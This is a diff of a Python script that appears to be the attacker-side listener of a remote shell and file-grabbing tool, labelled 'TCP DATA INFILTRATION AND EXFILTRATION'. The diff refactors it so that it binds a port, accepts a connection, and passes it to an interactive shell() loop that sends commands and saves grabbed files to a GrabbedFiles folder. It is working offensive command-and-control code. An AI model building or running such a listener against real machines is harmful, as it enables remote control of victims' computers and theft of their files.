@@ -12,24 +12,12 @@ from common import receiveFile
 from common import HashMatchError
 from common import sendFile
 
-ip = "0.0.0.0"
 destinationPath = os.path.join(os.path.expanduser('~'), 'GrabbedFiles')
 from common import port
 from common import chunksize
 from common import hashAlgorithm
 
-def connect():
-    initSocket = socket.socket()
-    initSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
-    initSocket.bind((ip, port))
-    initSocket.listen(1)
-    print("=" * 60)
-    print("TCP DATA INFILTRATION AND EXFILTRATION")
-    print("=" * 60)
-    print('[+] Listening for incoming TCP mySocketection on port', port)
-    mySocket, clientAddress = initSocket.accept()
-    print('[+] We got a mySocketection from', clientAddress)
-
+def shell(mySocket):
     while True:
         print("=" * 60)
         command = ''
@@ -70,6 +58,22 @@ def connect():
             print(mySocket.recv(chunksize).decode())
 
 def main():
-    connect()
+    initSocket = socket.socket()
+    initSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    initSocket.bind(('', port))
+    initSocket.listen(1)
+    print('=' * 60)
+    print('TCP DATA INFILTRATION AND EXFILTRATION')
+    print('=' * 60)
+    print('[+] Listening for incoming TCP connection on port', port)
+    mySocket, clientAddress = initSocket.accept()
+    print('[+] We got a connection from', clientAddress)
+
+    # Source - https://stackoverflow.com/a/26313282
+    # Posted by Mark Tolonen, modified by community. See post 'Timeline' for change history
+    # Retrieved 2026-03-16, License - CC BY-SA 4.0
+    # https://stackoverflow.com/questions/26313182/python-with-as-statement-and-multiple-return-values
+    with mySocket:
+        shell(mySocket)
 
 main()
